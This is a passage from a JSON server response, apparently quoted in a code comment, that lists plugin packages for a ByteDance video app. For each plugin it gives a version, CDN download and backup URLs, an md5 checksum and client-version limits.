{"packagename":"com.ixigua.plugin.wschannel","versioncode":2,"url":
"https://s3.pstatp.com/site/download/plugin_patch/plugin/4f5541059c4f51c5e41de4210edbe06c",
"backup_urls":["https://s1.pstatp.com/site/download/plugin_patch/plugin/4f5541059c4f51c5e41de4210edbe06c",
"https://s6.pstatp.com/site/download/plugin_patch/plugin/4f5541059c4f51c5e41de4210edbe06c"],
"md5":"4f5541059c4f51c5e41de4210edbe06c","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":100,"download_type":0,"clientversion_min":6200,"clientversion_max":0},
{"packagename":"com.ixigua.live.cocos2dx","versioncode":7,"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/1dcde8d02a4c2c92a77239ac40133e58",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/1dcde8d02a4c2c92a77239ac40133e58",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/1dcde8d02a4c2c92a77239ac40133e58"],
"md5":"1dcde8d02a4c2c92a77239ac40133e58","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":99,"download_type":0,"clientversion_min":65800,"clientversion_max":0},
{"packagename":"com.bytedance.common.plugin.cronet","versioncode":175,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/d52bfb77496b722cdda60273b9cdd3c5",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/d52bfb77496b722cdda60273b9cdd3c5",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/d52bfb77496b722cdda60273b9cdd3c5"],
"md5":"d52bfb77496b722cdda60273b9cdd3c5","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":99,"download_type":0,"clientversion_min":72600,"clientversion_max":0},
{"packagename":"com.ss.ttm.mm","versioncode":28,"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/165818386ef8921100eb0befc9a07661",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/165818386ef8921100eb0befc9a07661",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/165818386ef8921100eb0befc9a07661"],
"md5":"165818386ef8921100eb0befc9a07661","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":1,"download_type":0,"clientversion_min":73400,"clientversion_max":0},
{"packagename":"com.projectscreen.android.plugin","versioncode":40,"url":
"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/c4bbe83af8654108bfedb68859a13f4e",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/c4bbe83af8654108bfedb68859a13f4e",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/c4bbe83af8654108bfedb68859a13f4e"],
"md5":"c4bbe83af8654108bfedb68859a13f4e","patch_url":"","patch_md5":"","offline":false,"revert":false,"wifionly":false,"Order":1,
"download_type":0,"clientversion_min":73400,"clientversion_max":0},
{"packagename":"com.ixigua.live.pushstream","versioncode":24,"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/505194a9cff4f20ba83a7564b8c83f9a",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/505194a9cff4f20ba83a7564b8c83f9a",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/505194a9cff4f20ba83a7564b8c83f9a"],
"md5":"505194a9cff4f20ba83a7564b8c83f9a","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":1,"download_type":2,"clientversion_min":73000,"clientversion_max":0},
{"packagename":"com.ixgua.common.plugin.upload","versioncode":3,
"url":"https://lf3-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/f57aa68ec4385c4e03a11deb751285b5",
"backup_urls":["https://lf1-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/f57aa68ec4385c4e03a11deb751285b5",
"https://lf6-ttcdn-tos.pstatp.com/obj/appeye/plugin/32/f57aa68ec4385c4e03a11deb751285b5"],
"md5":"f57aa68ec4385c4e03a11deb751285b5","patch_url":"","patch_md5":"","offline":false,"revert":false,
"wifionly":false,"Order":1,"download_type":0,"clientversion_min":73400,"clientversion_max":0}]},"message":"success"}

*/